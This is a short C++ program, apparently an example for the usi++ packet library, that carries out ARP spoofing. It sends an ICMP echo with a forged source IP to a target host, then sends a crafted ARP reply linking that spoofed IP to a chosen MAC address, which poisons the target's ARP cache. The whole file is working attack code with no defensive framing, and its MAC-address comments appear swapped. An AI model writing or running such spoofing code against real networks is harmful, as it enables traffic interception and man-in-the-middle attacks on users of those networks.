#include <usi++/usi++>
#include <usi++/arp.h>
#include <usi++/icmp.h>
#include <iostream>

using namespace usipp;


int main()
{
	unsigned char smac[] = {0, 0x40, 5, 0x6d, 0x1a, 0x90},		// dest-MAC
	              dmac[] = {0, 0x40, 5, 0x6d, 0x1a, 0x8f},		// our MAC (eth0)
		      bc[] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};	// broadcast-MAC
		      
	char *rip = "192.0.0.77",
	     *vip = "192.0.0.2";
	
	ARP *rep = new ARP("eth0", 0, smac, dmac);
	ICMP *icmp = new ICMP(vip);
	
	icmp->set_type(ICMP_ECHO);
	icmp->set_src(rip);
	icmp->sendpack("");
	delete icmp;

	
	rep->set_op(ARPOP_REPLY);
	rep->set_tpa(vip, ETH_P_IP);
	rep->set_spa(rip, ETH_P_IP);
	rep->set_tha(smac, ARPHRD_ETHER);
	rep->set_sha(dmac, ARPHRD_ETHER);
	rep->sendpack("");
	delete rep;
	
        return 0;
}

        
